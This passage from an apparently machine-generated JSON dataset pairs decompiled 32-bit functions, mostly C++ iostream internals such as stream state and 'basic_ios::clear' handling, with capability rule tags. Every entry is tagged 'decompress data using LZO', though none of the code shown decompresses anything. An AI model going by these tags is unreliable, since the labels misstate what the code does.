fcn.004a3840();\n    puStack424 = 0x46730f;\n    piStack420 = piVar5;\n    uStack436 = fcn.0041b360();\n    puStack424 = 0x467316;\n    fcn.004a3840();\n    puStack424 = 0x46731e;\n    piStack420 = uStack436;\n    fcn.0041b360();\n    uStack492 = 0;\n    uStack500 = 0x46733e;\n    piStack496 = extraout_ECX_02;\n    iStack428 = unaff_EDI;\n    puStack424 = &stack0xfffffeac;\n    fcn.00468920();\n    if (cStack453 == '\\0') {\n        return extraout_ECX_02;\n    }\n    uStack452 = 0;\n    iStack516 = *(*extraout_ECX_02 + -0xc) + extraout_ECX_02;\n    if (*(iStack516 + 0x84) != NULL) {\n        piStack504 = *(iStack516 + 0x78);\n        uStack480 = uStack416;\n        puStack484 = &stack0xfffffe3c;\n        piStack496 = NULL;\n        uStack492 = 0xffffffff;\n        uStack500 = 0xffffffff;\n        puStack508 = 0x467396;\n        iStack488 = iStack516;\n        (**(**(iStack516 + 0x84) + 0x1c))();\ncode_r0x00467399:\n        if (uStack452 == 0) {\n            return extraout_ECX_02;\n        }\n        piStack504 = uStack452 | *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x14);\n        puStack508 = 0x4673c2;\n        fcn.0049c600();\n        return extraout_ECX_02;\n    }\n    puStack508 = 0x4673d6;\n    uVar11 = fcn.0049e780();\n    piStack504 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack508 = 0x467400;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            puStack508 = 0x467414;\n            fcn.004a3b60();\n        }\n        puStack508 = 0x467419;\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        puStack508 = 0x4673e3;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            puStack508 = 0x4673f9;\n            fcn.004a3840();\n            goto code_r0x00467399;\n        }\n        puStack508 = 0x467422;\n        fcn.004a3b60();\n        piVar5 = extraout_ECX_02;\n    }\n    puStack508 = 0x467427;\n    fcn.004a3840();\n    puStack508 = 0x46742f;\n    piStack504 = piVar5;\n    uStack520 = fcn.0041b360();\n    puStack508 = 0x467436;\n    fcn.004a3840();\n    puStack508 = 0x46743e;\n    piStack504 = uStack520;\n    fcn.0041b360();\n    uVar12 = 0x46745e;\n    piVar5 = extraout_ECX_03;\n    iStack512 = unaff_EDI;\n    puStack508 = &stack0xfffffe58;\n    fcn.00468920(extraout_ECX_03, 0);\n    if (cStack537 == '\\0') {\n        return extraout_ECX_03;\n    }\n    uStack536 = 0;\n    iVar9 = *(*extraout_ECX_03 + -0xc) + extraout_ECX_03;\n    if (*(iVar9 + 0x84) != NULL) {\n        (**(**(iVar9 + 0x84) + 0x20))(*(iVar9 + 0x78), 0xffffffff, 0, 0xffffffff, iVar9, &stack0xfffffde8, uStack500);\ncode_r0x004674b9:\n        if (uStack536 == 0) {\n            return extraout_ECX_03;\n        }\n        fcn.0049c600(uStack536 | *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x14));\n        return extraout_ECX_03;\n    }\n    uVar11 = fcn.0049e780();\n    if (uVar11 >> 0x20 == 1) {\n        fcn.004a36d0(uVar11);\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        piVar3 = fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0(uVar11);\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            goto code_r0x004674b9;\n        }\n        fcn.004a3b60();\n        piVar3 = extraout_ECX_03;\n    }\n    fcn.004a3840();\n    uVar4 = fcn.0041b360(piVar3);\n    fcn.004a3840();\n    fcn.0041b360(uVar4);\n    piVar3 = *(extraout_ECX_04 + *(*extraout_ECX_04 + -0xc) + 0x7c);\n    if (piVar3 != NULL) {\n        if (*(piVar3 + 7) == '\\0') {\n            fcn.00431cc0();\n            iVar9 = 10;\n            if (*(*piVar3 + 0x18) != 0x431f70) {\n                cVar2 = (**(*piVar3 + 0x18))(10);\n                iVar9 = cVar2;\n            }\n        }\n        else {\n            iVar9 = *(piVar3 + 0x27);\n        }\n        piVar5 = fcn.004675e0(uVar12, piVar5, iVar9);\n        return piVar5;\n    }\n    fcn.0049e780();\n    extraout_ECX_05[1] = 0;\n    fcn.00468920(extraout_ECX_05, 1);\n    if (cStack653 == '\\0') {\n        if (0 < in_stack_fffffd98) {\n            *in_stack_fffffd9c = 0;\n            iVar9 = extraout_ECX_05[1];\n            goto joined_r0x004676a0;\n        }\n        iVar9 = extraout_ECX_05[1];\ncode_r0x00467746:\n        if (iVar9 != 0) {\n            return extraout_ECX_05;\n        }\n    }\n    else {\n        piVar5 = *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x78);\n        puVar7 = piVar5[2];\n        if (puVar7 <= piVar5[3] && piVar5[3] != puVar7) goto code_r0x004676ae;\ncode_r0x00467670:\n        uVar6 = (**(*piVar5 + 0x24))();\n        iVar9 = extraout_ECX_05[1];\n        puVar10 = in_stack_fffffd9c;\n        if (iVar9 + 1 < in_stack_fffffd98) {\n            do {\n                in_stack_fffffd9c = puVar10;\n                if (uVar6 == 0xffffffff) {\ncode_r0x004676ee:\n                    uVar6 = 2;\n                    puVar10 = in_stack_fffffd9c;\ncode_r0x004676f3:\n                    if (0 < in_stack_fffffd98) {\n                        *puVar10 = 0;\n                    }\n                    if (extraout_ECX_05[1] == 0) {\n                        uVar6 = uVar6 | 4;\n                    }\n                    else if (uVar6 == 0) {\n                        return extraout_ECX_05;\n                    }\n                    goto code_r0x00467631;\n                }\n                if ((uStack604 & 0xff) == uVar6) {\n                    uVar6 = 0;\n                    goto code_r0x004676f3;\n                }\n                in_stack_fffffd9c = puVar10 + 1;\n                *puVar10 = uVar6;\n                puVar7 = piVar5[2];\n                puVar8 = piVar5[3];\n                extraout_ECX_05[1] = extraout_ECX_05[1] + 1;\n                if (puVar7 < puVar8) {\n                    puVar7 = puVar7 + 1;\n                    piVar5[2] = puVar7;\n                }\n                else {\n                    iVar9 = (**(*piVar5 + 0x28))();\n                    if (iVar9 == -1) goto code_r0x004676ee;\n                    puVar7 = piVar5[2];\n                    puVar8 = piVar5[3];\n                }\n                if (puVar8 <= puVar7) goto code_r0x00467670;\ncode_r0x004676ae:\n                iVar9 = extraout_ECX_05[1];\n                uVar6 = *puVar7;\n                puVar10 = in_stack_fffffd9c;\n                if (in_stack_fffffd98 <= iVar9 + 1) break;\n            } while( true );\n        }\n        if (uVar6 == 0xffffffff) {\n            if (0 < in_stack_fffffd98) {\n                *in_stack_fffffd9c = 0;\n                iVar9 = extraout_ECX_05[1];\n            }\n            if (iVar9 == 0) {\n                uVar6 = 6;\n            }\n            else {\n                uVar6 = 2;\n            }\n            goto code_r0x00467631;\n        }\n        if (in_stack_fffffd98 < 1) goto code_r0x00467746;\n        *in_stack_fffffd9c = 0;\n        iVar9 = extraout_ECX_05[1];\njoined_r0x004676a0:\n        if (iVar9 != 0) {\n            return extraout_ECX_05;\n        }\n    }\n    uVar6 = 4;\ncode_r0x00467631:\n    fcn.0049c600(uVar6 | *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x14));\n    return extraout_ECX_05;\n}\n",
        "token_count": 7442
    },
    "00469a10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x004673b0)\n// WARNING: Removing unreachable block (ram,0x00467290)\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00469a10(ushort *arg_8h)\n\n{\n    uint32_t *puVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX_03;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint8_t *puVar9;\n    int32_t extraout_EDX_01;\n    int32_t iVar10;\n    uchar *puVar11;\n    ulong uVar12;\n    char cStack401;\n    int32_t in_stack_fffffe94;\n    uchar *in_stack_fffffe98;\n    uint32_t uStack352;\n    uint uVar13;\n    char cStack285;\n    uint32_t auStack284 [4];\n    uint uStack268;\n    int32_t iStack264;\n    char cStack201;\n    char cStack117;\n    uint var_21h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    fcn.00468920();\n    if (var_21h == '\\0') {\n        return in_ECX;\n    }\n    bVar2 = false;\n    piVar6 = *(in_ECX + *(*in_ECX + -0xc) + 0x84);\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 0xc))();\n        if (var_1ch < -0x8000) {\n            bVar2 = true;\n            *arg_8h = 0x8000;\n        }\n        else {\n            if (0x7fff < var_1ch) {\n                *arg_8h = 0x7fff;\n                goto code_r0x00469add;\n            }\n            *arg_8h = var_1ch;\n        }\ncode_r0x00469aac:\n        if (!bVar2) {\n            return in_ECX;\n        }\ncode_r0x00469add:\n        fcn.0049c600();\n        return in_ECX;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_01 == 1) {\n        fcn.004a36d0();\n        iVar10 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar10 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            goto code_r0x00469aac;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (cStack117 == '\\0') {\n        return extraout_ECX_03;\n    }\n    piVar6 = *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x84);\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 0x10))();\n        return extraout_ECX_03;\n    }\n    fcn.0049e780();\n    if (extraout_EDX == 1) {\n        fcn.004a36d0();\n        iVar10 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar10 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_03;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.00468920();\n    if (cStack201 == '\\0') {\n        return extraout_ECX;\n    }\n    iStack264 = *(*extraout_ECX + -0xc) + extraout_ECX;\n    if (*(iStack264 + 0x84) != NULL) {\n        (**(**(iStack264 + 0x84) + 0x1c))();\n        return extraout_ECX;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_00 == 1) {\n        fcn.004a36d0();\n        iVar10 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar10 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    uStack268 = fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    uVar13 = 0x46745e;\n    piVar6 = extraout_ECX_00;\n    fcn.00468920(extraout_ECX_00, 0);\n    if (cStack285 == '\\0') {\n        return extraout_ECX_00;\n    }\n    auStack284[0] = 0;\n    iVar10 = *(*extraout_ECX_00 + -0xc) + extraout_ECX_00;\n    if (*(iVar10 + 0x84) != NULL) {\n        (**(**(iVar10 + 0x84) + 0x20))(*(iVar10 + 0x78), 0xffffffff, 0, 0xffffffff, iVar10, auStack284, 0x46733e);\ncode_r0x004674b9:\n        if (auStack284[0] == 0) {\n            return extraout_ECX_00;\n        }\n        fcn.0049c600(auStack284[0] | *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x14));\n        return extraout_ECX_00;\n    }\n    uVar12 = fcn.0049e780();\n    if (uVar12 >> 0x20 == 1) {\n        fcn.004a36d0(uVar12);\n        iVar10 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        piVar4 = fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0(uVar12);\n        iVar10 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            goto code_r0x004674b9;\n        }\n        fcn.004a3b60();\n        piVar4 = extraout_ECX_00;\n    }\n    fcn.004a3840();\n    uVar5 = fcn.0041b360(piVar4);\n    fcn.004a3840();\n    fcn.0041b360(uVar5);\n    piVar4 = *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x7c);\n    if (piVar4 != NULL) {\n        if (*(piVar4 + 7) == '\\0') {\n            fcn.00431cc0();\n            iVar10 = 10;\n            if (*(*piVar4 + 0x18) != 0x431f70) {\n                cVar3 = (**(*piVar4 + 0x18))(10);\n                iVar10 = cVar3;\n            }\n        }\n        else {\n            iVar10 = *(piVar4 + 0x27);\n        }\n        piVar6 = fcn.004675e0(uVar13, piVar6, iVar10);\n        return piVar6;\n    }\n    fcn.0049e780();\n    extraout_ECX_02[1] = 0;\n    fcn.00468920(extraout_ECX_02, 1);\n    if (cStack401 == '\\0') {\n        if (0 < in_stack_fffffe94) {\n            *in_stack_fffffe98 = 0;\n            iVar10 = extraout_ECX_02[1];\n            goto joined_r0x004676a0;\n        }\n        iVar10 = extraout_ECX_02[1];\ncode_r0x00467746:\n        if (iVar10 != 0) {\n            return extraout_ECX_02;\n        }\n    }\n    else {\n        piVar6 = *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x78);\n        puVar8 = piVar6[2];\n        if (puVar8 <= piVar6[3] && piVar6[3] != puVar8) goto code_r0x004676ae;\ncode_r0x00467670:\n        uVar7 = (**(*piVar6 + 0x24))();\n        iVar10 = extraout_ECX_02[1];\n        puVar11 = in_stack_fffffe98;\n        if (iVar10 + 1 < in_stack_fffffe94) {\n            do {\n                in_stack_fffffe98 = puVar11;\n                if (uVar7 == 0xffffffff) {\ncode_r0x004676ee:\n                    uVar7 = 2;\n                    puVar11 = in_stack_fffffe98;\ncode_r0x004676f3:\n                    if (0 < in_stack_fffffe94) {\n                        *puVar11 = 0;\n                    }\n                    if (extraout_ECX_02[1] == 0) {\n                        uVar7 = uVar7 | 4;\n                    }\n                    else if (uVar7 == 0) {\n                        return extraout_ECX_02;\n                    }\n                    goto code_r0x00467631;\n                }\n                if ((uStack352 & 0xff) == uVar7) {\n                    uVar7 = 0;\n                    goto code_r0x004676f3;\n                }\n                in_stack_fffffe98 = puVar11 + 1;\n                *puVar11 = uVar7;\n                puVar8 = piVar6[2];\n                puVar9 = piVar6[3];\n                extraout_ECX_02[1] = extraout_ECX_02[1] + 1;\n                if (puVar8 < puVar9) {\n                    puVar8 = puVar8 + 1;\n                    piVar6[2] = puVar8;\n                }\n                else {\n                    iVar10 = (**(*piVar6 + 0x28))();\n                    if (iVar10 == -1) goto code_r0x004676ee;\n                    puVar8 = piVar6[2];\n                    puVar9 = piVar6[3];\n                }\n                if (puVar9 <= puVar8) goto code_r0x00467670;\ncode_r0x004676ae:\n                iVar10 = extraout_ECX_02[1];\n                uVar7 = *puVar8;\n                puVar11 = in_stack_fffffe98;\n                if (in_stack_fffffe94 <= iVar10 + 1) break;\n            } while( true );\n        }\n        if (uVar7 == 0xffffffff) {\n            if (0 < in_stack_fffffe94) {\n                *in_stack_fffffe98 = 0;\n                iVar10 = extraout_ECX_02[1];\n            }\n            if (iVar10 == 0) {\n                uVar7 = 6;\n            }\n            else {\n                uVar7 = 2;\n            }\n            goto code_r0x00467631;\n        }\n        if (in_stack_fffffe94 < 1) goto code_r0x00467746;\n        *in_stack_fffffe98 = 0;\n        iVar10 = extraout_ECX_02[1];\njoined_r0x004676a0:\n        if (iVar10 != 0) {\n            return extraout_ECX_02;\n        }\n    }\n    uVar7 = 4;\ncode_r0x00467631:\n    fcn.0049c600(uVar7 | *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x14));\n    return extraout_ECX_02;\n}\n",
        "token_count": 3392
    },
    "00469bb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00469bb0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    fcn.0046a230();\n    if (var_10h != '\\0') {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        if (piVar1[5] < piVar1[6]) {\n            *piVar1[5] = arg_8h;\n            piVar1[5] = piVar1[5] + 1;\n        }\n        else {\n            iVar3 = (**(*piVar1 + 0x34))(arg_8h);\n            if (iVar3 == -1) {\n                fcn.0049c600();\n            }\n        }\n    }\n    iVar3 = *(*var_ch + -0xc);\n    if ((*(var_ch + iVar3 + 0xd) & 0x20) != 0) {\n        cVar2 = fcn.0049e8f0();\n        if ((cVar2 == '\\0') && (piVar1 = *(var_ch + iVar3 + 0x78),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x18))();\n            if (iVar3 == -1) {\n                fcn.0049c600(*(var_ch + *(*var_ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 397
    },
    "00469d50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00469d50(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *(param_1 + *(*param_1 + -0xc) + 0x78);\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x18))();\n        if (iVar2 == -1) {\n            fcn.0049c600(*(param_1 + *(*param_1 + -0xc) + 0x14) | 1);\n            return param_1;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 150
    },
    "00469e00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00469e00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    if ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x14))(piVar1, arg_8h, arg_ch, arg_10h, arg_14h, 0x10);\n        if ((var_34h & var_38h) == 0xffffffff) {\n            fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "00469f20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00469f20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint var_ch;\n    \n    if ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, arg_8h, arg_ch, arg_10h, 0x10);\n        if ((var_24h & var_28h) == 0xffffffff) {\n            fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "0046a100": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0046a100(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    fcn.0046a230();\n    if (var_10h != '\\0') {\n        iVar3 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x30))(arg_8h, arg_ch);\n        if (arg_ch != iVar3) {\n            fcn.0049c600();\n        }\n    }\n    iVar3 = *(*var_ch + -0xc);\n    if ((*(var_ch + iVar3 + 0xd) & 0x20) != 0) {\n        cVar2 = fcn.0049e8f0();\n        if ((cVar2 == '\\0') && (piVar1 = *(var_ch + iVar3 + 0x78),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x18))();\n            if (iVar3 == -1) {\n                fcn.0049c600(*(var_ch + *(*var_ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "0046a230": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0046a230(uchar *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iStack24;\n    uint uStack20;\n    \n    *param_1 = 0;\n    iVar1 = *param_2;\n    *(param_1 + 4) = param_2;\n    uVar3 = *(iVar1 + -0xc) + param_2;\n    uVar5 = *(uVar3 + 0x14);\n    if (*(uVar3 + 0x70) != 0) {\n        if (uVar5 != 0) goto code_r0x0046a258;\n        fcn.00469d50();\n        uVar3 = param_2 + *(*param_2 + -0xc);\n        uVar5 = *(uVar3 + 0x14);\n    }\n    if (uVar5 == 0) {\n        *param_1 = 1;\n        return uVar3;\n    }\ncode_r0x0046a258:\n    uVar4 = uVar5 | 4;\n    if (*(uVar3 + 0x78) == 0) {\n        uVar4 = uVar5 | 5;\n    }\n    *(uVar3 + 0x14) = uVar4;\n    if ((*(uVar3 + 0x10) & uVar4) == 0) {\n        return uVar4;\n    }\n    fcn.0049e910(\"basic_ios::clear\");\n    fcn.0048f500(iStack24 + 0x6c);\n    fcn.0049ab80(iStack24, uStack20);\n    fcn.0048f620();\n    fcn.0049c380(uStack20);\n    piVar2 = *(iStack24 + 0x78);\n    if (piVar2 != NULL) {\n        fcn.0048f500(piVar2 + 7);\n        (**(*piVar2 + 8))(uStack20);\n        fcn.0048f670(uStack20);\n        fcn.0048f620();\n    }\n    return extraout_ECX;\n}\n",
        "token_count": 521
    },
    "0046a400": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0046a400(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0046a230();\n    if (var_20h == '\\0') goto code_r0x0046a497;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.0049e780();\ncode_r0x0046a563:\n        uVar6 = fcn.0049e780();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0046a2f0();\n            piVar7 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x0046a563;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.00431cc0();\n                var_30h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x431f70) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_30h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_30h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_30h = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 0x24))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_30h, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.0049c600();\n        }\n    }\ncode_r0x0046a497:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.0049e8f0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049c600(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1043
    },
    "0046a5e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0046a5e0(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0046a230();\n    if (var_20h == '\\0') goto code_r0x0046a684;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.0049e780();\ncode_r0x0046a753:\n        uVar6 = fcn.0049e780();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0046a2f0();\n            piVar7 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        